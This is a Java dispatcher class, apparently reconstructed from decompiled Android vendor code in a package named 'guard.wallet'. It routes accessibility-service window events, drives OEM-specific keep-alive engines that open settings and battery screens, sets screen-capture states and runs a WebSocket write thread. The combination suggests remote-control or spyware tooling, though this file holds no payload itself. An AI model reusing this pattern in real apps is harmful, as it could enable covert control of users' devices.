/**
 * 事件分发器 — 统一调度 AccessibilityDelegate / KeepAliveEngine / WebSocket 各类事件。
 *
 * vendor 原始类: o/d.java (316 行)
 * switch case:
 *   0  — AccessibilityDelegate 事件分发（遍历监听窗口）
 *   1  — AospKeepAliveEngine 启动应用详情
 *   2  — HuaweiEngine 启动华为系统设置
 *   3  — XiaomiEngine 启动应用详情
 *   4  — OppoEngine 启动应用详情
 *   5  — TranssionEngine 启动应用详情
 *   6  — VivoEngine 启动 App 耗电管理窗口
 *   7  — OverlayViewHelper.c 监听分发
 *   8  — AutomationHelper.d 过滤分发
 *   11 — o0 包调用（适配阴影）
 *   12 — WebSocket ping/pong 循环
 *   default — WebSocket 写线程
 *
 * 已删除:
 *   9  — f0 NIO 写入 (随 NIO 层删除)
 *   10 — HttpDataEmitterStub 调用 (随 NIO 层删除)
 */
package com.guard.wallet.delegate.task;

import com.guard.wallet.core.AppUtils;
import com.guard.wallet.websocket.VendorWebSocketClient;

import android.os.Build;
import android.util.Log;
import com.guard.wallet.MainApplication;
import com.guard.wallet.delegate.EngineHelper;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.req.ListenWindow;
import com.guard.wallet.req.ReqListenHelper;
import java.io.IOException;
import java.io.OutputStream;
import java.net.Socket;
import java.nio.ByteBuffer;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.Objects;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.atomic.AtomicReference;
import javax.net.ssl.SSLException;

public final class DelegateEventDispatcher implements Runnable {

    public final int a;
    public final Object b;
    public final Object c;

    // ADAPT: vendor constructor d(AbstractWebSocketServer) — use Object to avoid package shadowing
    public DelegateEventDispatcher(Object aVar) {
        this.a = 12;
        this.c = aVar;
        this.b = new ArrayList();
    }

    public DelegateEventDispatcher(Object obj, Object obj2, int i2) {
        this.a = i2;
        this.c = obj;
        this.b = obj2;
    }

    public final void a() throws IOException {
        VendorWebSocketClient client = (VendorWebSocketClient) this.c;
        client.syncInternalFields();
        while (!Thread.interrupted()) {
            try {
                ByteBuffer byteBuffer = (ByteBuffer) client.getEngine().outQueue.take();
                OutputStream os = client.getOutputStream();
                os.write(byteBuffer.array(), 0, byteBuffer.limit());
                os.flush();
            } catch (InterruptedException unused) {
                Iterator it = client.getEngine().outQueue.iterator();
                while (it.hasNext()) {
                    ByteBuffer byteBuffer2 = (ByteBuffer) it.next();
                    try {
                        OutputStream os = client.getOutputStream();
                        os.write(byteBuffer2.array(), 0, byteBuffer2.limit());
                        os.flush();
                    } catch (Exception ignored) {
                    }
                }
                Thread.currentThread().interrupt();
                return;
            }
        }
    }

    @Override
    public final void run() {
        String str;
        long nanoTime;
        switch (this.a) {
            case 0:
                /* AccessibilityDelegate event dispatch — iterate listen windows */
                com.guard.wallet.delegate.AccessibilityDelegate eVar = (com.guard.wallet.delegate.AccessibilityDelegate) this.c;
                com.guard.wallet.delegate.ListenWindowState j0Var = (com.guard.wallet.delegate.ListenWindowState) this.b;
                ConcurrentLinkedQueue concurrentLinkedQueue = eVar.d;
                try {
                    if (concurrentLinkedQueue.isEmpty() || j0Var == null) {
                        return;
                    }
                    Iterator it = concurrentLinkedQueue.iterator();
                    while (it.hasNext()) {
                        ListenWindow listenWindow = (ListenWindow) it.next();
                        if (listenWindow != null && listenWindow.getEventTypes() != null && !listenWindow.getEventTypes().isEmpty() && listenWindow.getEventTypes().contains(Integer.valueOf(j0Var.b)) && listenWindow.equals(new ListenWindow(j0Var.c, j0Var.d)) && eVar.p(listenWindow, j0Var.a)) {
                            eVar.e(listenWindow, j0Var);
                        }
                    }
                    return;
                } catch (Exception e2) {
                    AppUtils.s("AccessibilityDelegate:everyListenWindow", e2);
                    return;
                }
            case 1:
                /* AospKeepAliveEngine — launch app detail */
                com.guard.wallet.engine.AospKeepAliveEngine gVar = (com.guard.wallet.engine.AospKeepAliveEngine) this.c;
                String str2 = (String) this.b;
                int i2 = com.guard.wallet.engine.AospKeepAliveEngine.v;
                gVar.getClass();
                try {
                    if (EngineHelper.cY()) {
                        com.guard.wallet.utils.SystemHelper.T0(20);
                    }
                    gVar.r.set(Objects.equals(str2, "com.google.guard") ? com.guard.wallet.delegate.ScreenCaptureManager.e.d : com.guard.wallet.delegate.ScreenCaptureManager.e.c);
                    if (com.guard.wallet.utils.SystemHelper.Z0(str2)) {
                        Log.d("o.g", "\u542f\u52a8 ".concat(str2).concat(" \u5e94\u7528\u8be6\u60c5\u76d1\u542c\u7a97\u53e3\u6210\u529f"));
                        "\u542f\u52a8 ".concat(str2).concat(" \u5e94\u7528\u8be6\u60c5\u76d1\u542c\u7a97\u53e3\u6210\u529f");
                        return;
                    } else {
                        Log.e("o.g", "\u542f\u52a8 ".concat(str2).concat(" \u5e94\u7528\u8be6\u60c5\u76d1\u542c\u7a97\u53e3\u5931\u8d25"));
                        "\u542f\u52a8 ".concat(str2).concat(" \u5e94\u7528\u8be6\u60c5\u76d1\u542c\u7a97\u53e3\u5931\u8d25");
                        return;
                    }
                } catch (Exception e3) {
                    AppUtils.s("o.g", e3);
                    return;
                }
            case 2:
                /* HuaweiEngine — launch Huawei system settings */
                com.guard.wallet.engine.HuaweiEngine nVar = (com.guard.wallet.engine.HuaweiEngine) this.c;
                int i3 = com.guard.wallet.engine.HuaweiEngine.y;
                nVar.getClass();
                try {
                    if (EngineHelper.cY()) {
                        com.guard.wallet.utils.SystemHelper.T0(20);
                    }
                    if (com.guard.wallet.utils.SystemHelper.X0()) {
                        Log.d("o.n", "\u542f\u52a8\u534e\u4e3a\u7cfb\u7edf\u8bbe\u7f6e\u6210\u529f");
                        return;
                    } else {
                        Log.e("o.n", "\u542f\u52a8\u534e\u4e3a\u7cfb\u7edf\u8bbe\u7f6e\u5931\u8d25");
                        nVar.Z();
                        return;
                    }
                } catch (Exception e4) {
                    AppUtils.s("o.n", e4);
                    return;
                }
            case 3:
                /* XiaomiEngine — launch app detail */
                com.guard.wallet.engine.XiaomiEngine qVar = (com.guard.wallet.engine.XiaomiEngine) this.c;
                String str3 = (String) this.b;
                int i4 = com.guard.wallet.engine.XiaomiEngine.z;
                qVar.getClass();
                try {
                    if (!Build.BRAND.equalsIgnoreCase("poco") && EngineHelper.cY()) {
                        com.guard.wallet.utils.SystemHelper.T0(20);
                    }
                    qVar.r.set(Objects.equals(str3, "com.google.guard") ? com.guard.wallet.delegate.ScreenCaptureManager.e.d : com.guard.wallet.delegate.ScreenCaptureManager.e.c);
                    if (com.guard.wallet.utils.SystemHelper.Z0(str3)) {
                        Log.d("o.q", str3.concat(" \u542f\u52a8\u6210\u529f"));
                        str3.concat(" \u542f\u52a8\u6210\u529f");
                        return;
                    } else {
                        Log.e("o.q", str3.concat(" \u542f\u52a8\u5931\u8d25"));
                        str3.concat(" \u542f\u52a8\u5931\u8d25");
                        return;
                    }
                } catch (Exception e5) {
                    AppUtils.s("o.q", e5);
                    return;
                }
            case 4:
                /* OppoEngine — launch app detail */
                com.guard.wallet.engine.OppoEngine vVar = (com.guard.wallet.engine.OppoEngine) this.c;
                String str4 = (String) this.b;
                int i5 = com.guard.wallet.engine.OppoEngine.v;
                vVar.getClass();
                try {
                    if (EngineHelper.cY()) {
                        com.guard.wallet.utils.SystemHelper.T0(20);
                    }
                    vVar.r.set(Objects.equals(str4, "com.google.guard") ? com.guard.wallet.delegate.ScreenCaptureManager.e.d : com.guard.wallet.delegate.ScreenCaptureManager.e.c);
                    if (com.guard.wallet.utils.SystemHelper.Z0(str4)) {
                        Log.d("o.v", str4.concat(" \u542f\u52a8\u6210\u529f"));
                        str4.concat(" \u542f\u52a8\u6210\u529f");
                        return;
                    } else {
                        Log.e("o.v", str4.concat(" \u542f\u52a8\u5931\u8d25"));
                        str4.concat(" \u542f\u52a8\u5931\u8d25");
                        return;
                    }
                } catch (Exception e6) {
                    AppUtils.s("o.v", e6);
                    return;
                }
            case 5:
                /* TranssionEngine — launch app detail */
                com.guard.wallet.engine.TranssionEngine e0Var = (com.guard.wallet.engine.TranssionEngine) this.c;
                String str5 = (String) this.b;
                int i6 = com.guard.wallet.engine.TranssionEngine.y;
                e0Var.getClass();
                if (EngineHelper.cY()) {
                    com.guard.wallet.utils.SystemHelper.T0(20);
                }
                e0Var.r.set(Objects.equals(str5, "com.google.guard") ? com.guard.wallet.delegate.ScreenCaptureManager.e.d : com.guard.wallet.delegate.ScreenCaptureManager.e.c);
                String str6 = com.guard.wallet.utils.SystemHelper.Z0(str5) ? " \u5e94\u7528\u8be6\u60c5\u5df2\u542f\u52a8" : " \u5e94\u7528\u8be6\u60c5\u542f\u52a8\u5931\u8d25";
                Log.d("o.e0", str5.concat(str6));
                str5.concat(str6);
                return;
            case 6:
                /* VivoEngine — launch app power rank */
                com.guard.wallet.engine.VivoEngine i0Var = (com.guard.wallet.engine.VivoEngine) this.c;
                String str7 = (String) this.b;
                int i7 = com.guard.wallet.engine.VivoEngine.B;
                i0Var.getClass();
                try {
                    if (EngineHelper.cY()) {
                        com.guard.wallet.utils.SystemHelper.T0(20);
                    }
                    boolean equals = Objects.equals(str7, MainApplication.getInstance().getPackageName());
                    AtomicReference atomicReference = i0Var.r;
                    if (equals) {
                        atomicReference.set(com.guard.wallet.delegate.ScreenCaptureManager.e.b);
                    }
                    if (Objects.equals(str7, "com.google.guard")) {
                        atomicReference.set(com.guard.wallet.delegate.ScreenCaptureManager.e.c);
                    }
                    i0Var.s.set("prepareInAppPowerRank");
                    if (i0Var.A0()) {
                        Log.d("o.i0", "App\u8017\u7535\u7ba1\u7406\u7a97\u53e3\u5df2\u542f\u52a8");
                        str = " App\u8017\u7535\u7ba1\u7406\u7a97\u53e3\u5df2\u542f\u52a8";
                    } else {
                        Log.e("o.i0", "App\u8017\u7535\u7ba1\u7406\u7a97\u53e3\u542f\u52a8\u5931\u8d25");
                        str = " App\u8017\u7535\u7ba1\u7406\u7a97\u53e3\u542f\u52a8\u5931\u8d25";
                    }
                    str7.concat(str);
                    return;
                } catch (Exception e7) {
                    AppUtils.s("o.i0", e7);
                    return;
                }
            case 7:
                /* OverlayViewHelper.c — listen helper dispatch */
                com.guard.wallet.helper.OverlayViewHelper.c((com.guard.wallet.delegate.AccessibilityDelegate) this.c, (ReqListenHelper) this.b);
                return;
            case 8:
                /* AutomationHelper.d — filter dispatch */
                com.guard.wallet.helper.AutomationHelper.d((com.guard.wallet.delegate.AccessibilityDelegate) this.c, (CombineFilter) this.b);
                return;
            case 11:
                /* ADAPT: o0.h/o0.f access */
                EngineHelper.callO0HJ(this.c, this.b);
                return;
            case 12:
                /* WebSocket ping/pong loop */
                ((ArrayList) this.b).clear();
                try {
                    ((ArrayList) this.b).addAll(((com.guard.wallet.websocket.AbstractWebSocketServer) this.c).getConnections());
                    synchronized (((com.guard.wallet.websocket.AbstractWebSocketServer) this.c).lock) {
                        nanoTime = (long) (System.nanoTime() - (((com.guard.wallet.websocket.AbstractWebSocketServer) this.c).connectionLostTimeoutNanos * 1.5d));
                    }
                    Iterator it2 = ((ArrayList) this.b).iterator();
                    while (it2.hasNext()) {
                        com.guard.wallet.websocket.AbstractWebSocketServer.checkConnectionLost((com.guard.wallet.websocket.AbstractWebSocketServer) this.c, (com.guard.wallet.websocket.WebSocketConnection) it2.next(), nanoTime);
                    }
                } catch (Exception unused) {
                }
                ((ArrayList) this.b).clear();
                return;
            default:
                /* WebSocket write thread */
                Thread.currentThread().setName("WebSocketWriteThread-" + Thread.currentThread().getId());
                try {
                    try {
                        a();
                    } catch (IOException e8) {
                        VendorWebSocketClient aVar = (VendorWebSocketClient) this.c;
                        int i8 = VendorWebSocketClient.t;
                        aVar.getClass();
                        if (e8 instanceof SSLException) {
                            aVar.w(e8);
                        }
                        aVar.getEngine().eot();
                    }
                    VendorWebSocketClient client = (VendorWebSocketClient) this.c;
                    try {
                        Socket sock = client.getVendorSocket();
                        if (sock != null) {
                            sock.close();
                        }
                    } catch (IOException e9) {
                        client.w(e9);
                    }
                } catch (Throwable th) {
                    VendorWebSocketClient client2 = (VendorWebSocketClient) this.c;
                    try {
                        Socket sock2 = client2.getVendorSocket();
                        if (sock2 != null) {
                            sock2.close();
                        }
                    } catch (IOException e10) {
                        client2.w(e10);
                    }
                    throw th;
                }
                return;
        }
    }
}
